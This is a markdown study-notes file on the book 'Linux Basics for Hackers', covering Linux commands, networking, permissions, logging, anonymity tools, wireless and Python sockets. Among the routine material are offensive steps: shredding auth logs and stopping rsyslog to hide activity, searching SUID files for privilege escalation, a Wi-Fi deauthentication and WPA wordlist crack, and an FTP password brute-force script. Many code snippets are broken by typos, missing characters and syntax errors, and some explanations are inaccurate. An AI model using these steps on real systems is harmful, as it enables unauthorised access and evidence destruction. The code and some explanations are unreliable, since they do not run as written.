---
title: Linux Basics for Hackers
date: 2026-08-17
tags:
  - hacking
  - linux
  - book
---

https://www.amazon.com/Linux-Basics-Hackers-Networking-Scripting/dp/1593278551

## Finding

```bash
locate aircrack-ng
whereis aircrack-ng
which aircrack-ng
find -type f -name apache2
find / -type f -name apache2
find /etc -type f -name apache2.\*

ps aux
```

## Snort

```bash
apt-get install snort
cat /etc/snort/snort.conf

nl <file> # show file with numbered lines

tail -n+507 /etc/snort/snort.conf | head -n 6
```

## Network

```bash
ifconfig
iwconfig

ifconfig eth0 192.168.181.115 # sets ip
ifconfig eth0 192.168.181.115 netmask 255.255.0.0 broadcast # change mask and gateway

ifconfig eth0 down
ifconfig eth0 hw ether 00:11:22:33:44:55
ifconfig eth0 up

dig hackers-arise.com ns
dig hackers-arise.com mx

vi /etc/resolv.conf
```

### DHCP

Linux has `dhcpd` running in the background that assigns IP addresses to machines. It has logs, great for forensics.

```bash
dhclient eth0 # new IP
```

## Installing and Removing

`apt` or `apt-get`. `apt` may be preferred but `apt-get` has more function

`apt-cache search <keyword>` search for app

`apt-get install <package_name>` installs the app

`apt-get remove snort` removes app

`apt-get purge <package_name>` clears config files

`apt autoremove snort` removes deps

`apt-get update` updates packages

`apt-get upgrade` installs updates

Apt will search repositories from `sources.list`. 

`vi /etc/apt/sources.list` 

`apt-get install synaptic` and Gdebi are GUI instlal tools, no longer included by default in kali.

## Permissions

```bash
chown bob /tmp/bobsfile # grant ownership of file
chgrp security new IDS # change group
chmod 774 <filename> # changes permissions for owner, group, all
```

Decimal Notation

Uses octal, 0-7

| Binary | Octal | rwx  |
| ------ | ----- | ---- |
| 000    | 0     | ---  |
| 001    | 1     | --x  |
| 010    | 2     | -w-  |
| 011    | 3     | -wx- |
| 100    | 4     | r--  |
| 101    | 5     | r-x  |
| 111    | 7     | rwx  |
UGO syntax

`u` for user, `g` for group, `o` for others
`-` removes
`+` adds
`=` sets

Can be comma separated

More Secure Default

`666` is default for files
`777` is default for directories

umask is a three-digit ocatal for three permissions digits, but it is subtracted. 

Kali base:

`666 - 022 = 644`
`777 - 022 = 755`

### Temporary Root Permissions 

SUID: temp root 

To set SUID, enter a 4 before regular permissions. e.g. `4644`

SGID: temp for group

To set SGID, enter a 2 before regular permissions. e.g. 2644

Sticky bit: legacy, let's a user delete or rename files in a directory

### Special Permissions

Privilege escalation via SUID.

```bash
find / -user root -perm -4000 # files with SUID for root

```

## Processes

`ps` view processes

`ps aux` view all processes for all users

`msfconsole` start metasploit

`top` find greedy processes

Nice sets priority, low number is taken first.

`nice -n -10 /bin/slowprocess` set priority when starting process

`renice 19 6996` change priority of PID 6996

`kill <pid>` kill

| Signal Name | Number | Description                                                                                                                                   |
| ----------- | ------ | --------------------------------------------------------------------------------------------------------------------------------------------- |
| SIGHUP      | 1      | Hangup (HUP) signal. Stops the process and restarts with same PID                                                                             |
| SIGINT      | 2      | Interrupt signal. Weak kill signal that isn't guarenteed to work, but does most times.                                                        |
| SIGQUIT     | 3      | Core dump. Terminates the process and saves the process information in memory and then saves in the working directory with a file named core. |
| SIGTERM     | 15     | Termination (TERM) signal. Kill commands default signal.                                                                                      |
| SIGKILL     | 9      | Absolute kill signal. Forces the process to stop by senign the process's resources to a special device, /dev/null                             |
|             |        |                                                                                                                                               |
|             |        |                                                                                                                                               |

`killall -9 rogueprocess` killall by app name

`<script> &` run in background

`bg <PID>` move process to background

`fg <PID>` move process to foreground

### Schedule

`at` sets up a daemon, `atd` which allows scheduling a single job

`crond` daemon is more suited for scheduling every day, week, or month

```bash
at 7:20pm # current day 7:20
at 7:20pm June 25 
at now + 20 minutes 
at tomorrow
```

## Environment Variables

```bash
env # dump default env
set | more # view all env varss

HISTSIZE=0 # set for session

set> ~/valueofALLon01012019.txt # log all current vals
export HISTSIZE # make permenant

PS1="World's Best Hacker: #" # change prompt

echo $PATH # current path
PATH=$PATH:/root/newhackingtool # append path

unset <varname> 
```

### Scripting

```bash
nmap <type of scan><target IP><optionally, target port> # scan for ports
nmap -sT 192.168.181.1 # -sT scan TCP connect
nmap -sT 192.168.181.1 -p 3306 # scan for a port


```


```bash
! /bin/bash

echo "Enter the starting IP address : "
read FirstIP

echo "Enter the last octet of the last IP address : "
read LastOctetIP

echo "Enter the port number you want to scan for : "
read port

nmap -sT ${firstIP}/${LastOctetIP} -p ${port} > /dev/null -oG mysqlscan

cat mysqlscan | grep open > mysqlscan2

cat mysqlscan2


```

## Compressing and Uncompressing

```bash
tar -cvf HackersArise.tar hackersarise1 hackersarise2 hackersarise3 # compress, create, verbose, write to file

tar -tvf HackersArise.tar # display contents without extracting

tar -xvf HackersArise.tar # extract

```

| Command  | files         | uses                     |
| -------- | ------------- | ------------------------ |
| gzip     | .tar.gz, .tgz | in between               |
| bzip2    | .tar.bz2      | slowest, smallest files. |
| compress | .tar.z        | fastest, larger files.   |
```bash
gzip HackersArise.* # compress a file called HackersArise.tar
gunzip HackersArise.* # unzip

bzip2 HackersArise.*
bunzip2 HackersArise.*

compress HackersArise.*
uncompress HackersArise.*

dd # bit by bit copy, even deleted files
dd if=inputfile of=outputfile

dd if=/dev/sdb of=/root/flashcopy # copy flash drive called sdb

dd if=/dev/media of=/root/flashcopy bs=4096 conv:noerror # noerror, set block size


```

## Filesystem

`/dev` special directory, short for device

Logical drives are mounted with labels. 

`fd0`  floppy drive
`hda` hard drive, legacy IDE or E-IDE
`sda` modern SATA and SCSI

Linux increments the last letter in alphabetical order, so first is sda, than sdb, etc.

Partitions are labeled with a minor number that comes after the drive designation.

`sda1` first partition on the first SATA drive
`sda2` second partition on the first STA drive

```bash
fdisk -l

ls -la /dev # list devices, first char is c (char) or b (block) for the type of device transfer

lsblk # list block info

mount /dev/sdb1 /mnt # mount drive
umount /dev/sdb1 # unmount

df # disk free info

fsck # file system check, checks for errors
umount /dev/sdb1
fsck -p /dev/sdb1 # check and fix errors
```

## Logging

`syslogd` daemon for logging events

```bash
locate rsyslog # find all related files

cat /etc/rsyslog.conf # rsyslog conf file


```

Facilities can be:
- auth, authpriv
- cron
- daemon
- kern
- lpr
- mail
- user
- \* all

Priorities:
- debug
- info
- notice
- warning
- warn
- error
- err
- crit
- alert
- emerg
- panic

Action is the filename for the log output

Log rotate auto cleans up logs

`vi /etc/logrotate.conf` log rotation

`ls /var/log/auth.log*` auth logs

### Stealth

`shred` overwrite files repeatedly to make recovery harder

`shred -f -n 10 /var/log/auth.log.*` shred log 10 times

`service rsyslog stop` disable logging

## Services

```bash
service apache2 start # start service
service apache2 stop # stop servicew
service apache2 restart # restart service

raspistill -v -o firstpicture.jpg # raspberry pi spy

service postgresql start
msfconsole # start metasploit
msfdb init # init metasploit

su postgres
createuser msf_user -P
createdb --owner=msf_user hackers_arise_db
exit
db_connect msf_user:password@127.0.0.1/hackers_arise_db
db_status

```

## Becoming Secure and Anonymous

```bash
traceroute google.com # trace a route

```

### onion router system

- TOR
- only the previous router is unencrpyted, making it hard to find a trail
- packets are sent over a network of over 7,000 routers around the world
- encrypts data, destination, and sender IP address of each packet
- encrypted and decrypted at each hop
-  https://www.torproject.org/
- can be slow
- can access dark web
- `.onion` TLD
- considered a threat by governments
- research to break TOR is happening
- NSA has own TOR routers

### Proxy Servers

- middleman in internet traffic
- given the IP of the proxy before passing it on
- proxy will likely log
- using multiple proxies, proxy chain makes it harder to get data
- `proxychains` is in Kali. proxychains < the command you want proxied> < arguments>
- `/etc/proxychains.conf` proxy config
- find free proxies: http://www.hidemyna.me, http://www.hidemy.name/
- `dynamic_chain` will automatically use every proxy in a chain and skip down ones
- `random_chain` different path every time, can't be combined with dynamic or strict

### VPN

Relatively anonymous. Paid is best.

- IPVanish
- NordVPN
- ExpressVPN
- CyberGhost
- Golden Frog VPN
- Hide My Ass (HMA)
- Private Internet Access
- PureVPN
- TorGuard
- Buffered VPN

- VPN has info, and could sell it

### Encrypted Email

- ProtonMail

## Wireless Networks

- `AP` access point, the device wireless users connect to for internet access
- `ESSID` (extended service set identifier) the same as SSID but for multipel APs in a wireless LAN
- `BSSID` (basic service set identifier) unique identifier of each AP, same as the MAC address of the device
- `SSID` (service set identifier) name of the network
- `channels` 1-14 channels. US: 1-11
- `Power` the closer to the AP, the greater the power and easier the connection is to crack
- `Security` the security protocol used on the Wi-Fi AP. 
	- Wired Equivalent Privacy (WEP), badly flawed, easily cracked
	- Wi-Fi Protected Access (WPA): bit more secure
	- WPA2-PSK: much more secure and usese a shared private key that all users share, most common except enterprise Wi-Fi
- `Modes` 
	- managed: ready to join or has joined an AP
	- master: ready to act as or already is an AP
	- monitor: 
- `Wireless range` in the US, Wi-Fi AP must legally broadcast its signal at an upper limit of .5 watts. normally 300 feet (100 meters). Hi-gain atennas can extend to 20 mi
- `Fequency` 2.4GHz and 5GHz

```bash
iwconfig
iwlist wlan0 scan

nmcli # network management
nmcli dev wifi # get wifi
nmcli dev wifi connect AP-SSID password APpassword

airmon-ng start wlan0 # monitor mode network card
airodump-ng wlan0mon # dump wifi

 three terminals
airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0moon # captures all pakcets
aireplay-ng --deauth 100 -a 01:01:AA:BB:CC:22-c A0:A3:E2:44:7C:E5 wlan0mo # knock everyone off and force re-auth
aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hacker-ArisePSK.cap # use a list to find password in hash


```

### Aircrack-ng

- `BSSID`: the MAC address of the AP or client
- `PWR` strength of signal
- `ENC` the encryption used to secure the transmission
- `#data` throughput rate
- `CH` channel
- `ESSID` the name of AP

### Bluetooth

- 2.4-2.485GHz, spread spectrum, frequency hopping 1,600 per second
- 10 meter range min, up to 100 meters, further with special antennaes
- pairing shares:
	- name
	- class
	- list of services
	- technical information

BlueZ: linux tool for scanning Bluetooth

	- `hciconfig` similar to ifconfig
	- `hcitool` inquirey tool to provide device name, device id, device class, and device clock info
	- `hcidump` sniff the bluetooth communication

 https://www.bluetooth.org/en-us/specification/assigned-numbers/service-discovery/


```bash
hciconfig # check config
hciconfig hci0 up # check if connection is enabled
hcitool scan # scan
hcitool inq # gather info
```

### Scan for Services

SDP (Service Discovery Protocol): bluetooth protocol for searching for bluetooth

```bash
sdptool browse MACaddress
```

Send a ping

```bash
l2ping MACaddress -c NumberOfPackets

```

## Managing the Linux Kernel and Loadable Kernel Modules

Kernel is the center of the OS. 

Kernel modules can be added or removed

LKMs have access to the lowest levels of the kernel, great target for hacking

Rootkit, embeds into the kernel of the OS, often through LKMs

```bash
uname -a # list OS distro info
cat /proc/version # similar info

sysctl # tuning, temp changes, to make permenant edit /etc/sysctl.conf

sysctl -a | grep ipv4 | less # ipv4 config

sysctl -w net.ipv4.ip_forward=1 # enable ip forwarding

lsmod # old way to manage modules

modinfo <name> # info about module
modinfo bluetooth 

modprobe -a <module name> # add module
modprobe -r <module to be removed> # remove module
```

## Automating tasks

Cron

Fields: minute hour day of the month month day of the week

```bash
cron
/etc/crontab # stored crons

crontab -e # edit crons

00 2 * * 0 backup /bin/systembackup.sh # schedule backup


```

shortcuts

- @yearly
- @annually
- @monthly
- weeklyreboot
- @daily
- @midnight
- @noon
- @reboot

Scripts run on startup are known as rc scripts. Found in `/etc/init.d/rc`

Run levels
- 0: halt the system
- 1: single-user/minimal mode
- 2-5 multiuser modules
- 6: reboot the system

Adding to rc.d

```bash
update-rc.d <name of the script or service> <remove|defaults|disable|enable>

update-rc.d postgresql defaults

apt-get install rcconf # adding services with gui
rcconf


```


## Python for Hackers

- https://xael.org port scanner

TCP client

```python
!/usr/bin/python3
 ./HackersAriseSSHBannerGrab.py
import socket

s = socker.socket()
s.connect("127.0.0.1", 22))
answer = s.recv(1024)
print(answer)
s.close()
```

Grabs banner. Application, version, OS

```python
!/usr/bin/python3
 tcp_server.py

import socket

TCP_IP "192.168.181.190"
TCP_PORT = 6996
BUFFER_SIZE = 100

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(TCP_IP, TCP_PORT)
s.listen(1)
conn, addr = s.accept()
print("Conneciton address: ", addr)

wihle True:
  data = conn.recv(BUFFER_SIZE)
  if not data:
    break
  print("Recieved data: ", data)
    conn.send(data) # echo
    
conn.close()
```


Open and run the script.

Port Banner Scanner

```python
import socket

Ports = [21,22,25,3306]

for port in Ports:
  s = socket.socket()
  print("This it the banner for the port")
  print(port)
  s.connect(("192.168.1.101", port))
  answer = s.recv(1024)
  print(answer)
  s.close()
```


FTP Cracker
```python
import ftplib

server = input("FTP Server: ")
user = input("username: ")
password_list = input("Path to Password list > ")

try:
  with open(password_list, 'r') as pw:
    for word in pw:
      word = word.strip("\r\n")
      
      try:
        ftp = ftplib.FTP(server)
        ftp.login(user, word)
        
        print(f"Success! The password is {word}")
      except ftplib.error_perm as exc:
        print("still stying...", exc)
except Exception as exc:
  print("Wordlist error: ", exc)
```

